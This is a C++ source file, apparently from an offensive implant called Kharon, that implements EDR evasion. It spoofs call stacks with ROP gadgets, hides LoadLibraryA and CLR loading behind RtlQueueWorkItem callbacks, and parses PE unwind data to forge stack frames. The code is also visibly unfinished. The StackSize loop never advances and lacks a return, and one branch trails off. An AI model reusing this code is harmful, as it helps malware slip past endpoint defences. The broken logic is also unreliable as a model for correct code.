#include <Kharon.h>

EXTERN_C VOID CLRCreateInstanceProxy( _In_ PVOID Context );
EXTERN_C VOID LoadLibraryAProxy( _In_ PVOID Context );

auto DECLFN Spoof::WorkCall(
    _In_ UPTR Context,
    _In_ INT8 Identifier
) -> LONG {
    HANDLE Notify = nullptr;
    LONG   Status = STATUS_UNSUCCESSFUL;
    ULONG  WtRest = 0;

    WORKERCALLBACKFUNC WorkerCallback = nullptr;

    switch ( Identifier ) {
        case WkrClrCreateInstance: {
            WorkerCallback = (WORKERCALLBACKFUNC)CLRCreateInstanceProxy; break;
        }
        case WkrLoadLibraryA: {
            // WorkerCallback = (WORKERCALLBACKFUNC)LoadLibraryAProxy; break;
            WorkerCallback = (WORKERCALLBACKFUNC)static_cast<LOAD_CTX*>( (PVOID)Context )->LoadLibraryAPtr;
            Context        = static_cast<LOAD_CTX*>( (PVOID)Context )->LibraryName; break;
        }
        default:
            return STATUS_INVALID_PARAMETER;
    }
    
    Status = Self->Ntdll.NtCreateEvent( &Notify, EVENT_ALL_ACCESS, nullptr, NotificationEvent, FALSE );
    if ( Status != STATUS_SUCCESS ) goto _KH_END;

    Status = Self->Ntdll.RtlQueueWorkItem( (WORKERCALLBACKFUNC)WorkerCallback, (PVOID)Context, WT_EXECUTEDEFAULT );
    if ( Status != STATUS_SUCCESS ) goto _KH_END;

    Status = Self->Ntdll.RtlQueueWorkItem( (WORKERCALLBACKFUNC)Self->Krnl32.SetEvent, (PVOID)Notify, WT_EXECUTEDEFAULT );
    if ( Status != STATUS_SUCCESS ) goto _KH_END;
    
     WtRest = Self->Krnl32.WaitForSingleObject( Notify, INFINITE );
     if ( WtRest != WAIT_OBJECT_0 ) {
        Status = STATUS_TIMEOUT;
     }

_KH_END:
    if ( Notify ) Self->Ntdll.NtClose( Notify );

    return Status;
}

EXTERN_C PVOID SpoofCall( UPTR Lib, UPTR Fnc, PVOID );

template <typename... Args>
auto DECLFN Spoof::Call(
    _In_ UPTR Lib, 
    _In_ UPTR Fnc, 
    Args... args
) {
    
    do {
        this->Setup.Gadget.Ptr = Self->Usf->FindGadget( this->Setup.Gadget.Lib, 0x23 );

    } while ( ! this->Setup.Gadget.Size );

    return SpoofCall( Lib, Fnc, (PVOID)&Setup );
}

auto DECLFN Spoof::GetRtmEntry(
    _In_ UPTR LibBase,
    _In_ UPTR FncOffset
) -> PIMAGE_RUNTIME_FUNCTION_ENTRY {
    PRUNTIME_FUNCTION       FncTable = { 0 };
    PIMAGE_EXPORT_DIRECTORY ExpDir   = { 0 };
    PIMAGE_NT_HEADERS       Header   = { 0 };
    PIMAGE_DATA_DIRECTORY   DataDir  = { 0 };

    Header   = (PIMAGE_NT_HEADERS)( LibBase + ( (PIMAGE_DOS_HEADER)( LibBase ) )->e_lfanew );
    DataDir  = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
    FncTable = (PRUNTIME_FUNCTION)( LibBase + DataDir->VirtualAddress );
    DataDir  = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    ExpDir   = (PIMAGE_EXPORT_DIRECTORY)( LibBase + DataDir->VirtualAddress );

    for ( INT i = 0; i < ExpDir->NumberOfFunctions; i++ ) {
        if ( FncTable[i].BeginAddress == FncOffset ) return (PIMAGE_RUNTIME_FUNCTION_ENTRY)( FncTable + i );
    }

    return nullptr;
}

// auto DECLFN Spoof::StackSizeWrapper(
//     _In_ PVOID RetAddress
// )

auto DECLFN Spoof::StackSize(
    _In_ UPTR  LibBase,
    _In_ PVOID UnwInfo
) -> ULONG {
    UNWIND_INFO*      UwInfo  = reinterpret_cast<PUNWIND_INFO>( UnwInfo );
    UNWIND_CODE*      UwCode  = UwInfo->UnwindCode;
    RUNTIME_FUNCTION* RtmFnc  = { 0 };
    REG_CTX           Context = { 0 };

    ULONG FrameSize = 0;
    ULONG Total     = 0;
    ULONG Index     = 0;
    ULONG CodeCount = UwInfo->CountOfCodes;

    while ( Index < CodeCount ) {
        switch ( UwCode->UnwindOp ) {
            case UWOP_PUSH_NONVOL: {
                if ( UwCode->OpInfo == SpfRSP ) return 0;
                Total += 8; break;
            }
            case UWOP_ALLOC_LARGE: {
                UwCode = (PUNWIND_CODE)( (PUINT16)UwCode + 1 );
                Index++;
                FrameSize = UwCode->FrameOffset;

                if ( UwCode->OpInfo == 0 ) {
                    FrameSize *= 8;
                } else {
                    UwCode = (PUNWIND_CODE)( (PUINT16)UwCode + 1 );
                    Index++;
                    FrameSize += UwCode->FrameOffset << 16;
                }

                Total += FrameSize; break;
            }
            case UWOP_ALLOC_SMALL: {
                Total += 8 * ( UwCode->OpInfo + 1 ); break;
            }
            case UWOP_SET_FPREG: {
                break;
            }
            case UWOP_SAVE_NONVOL: {
                if ( UwCode->OpInfo == SpfRSP ) return 0;
                else {
                    DEF32( &Context + UwCode->OpInfo )  = Total + ( (UNWIND_CODE*)( U_32( UwCode + 1 ) ) )->FrameOffset * 8;

                    // UwCode.
                }
            } 
        }
        
    }
}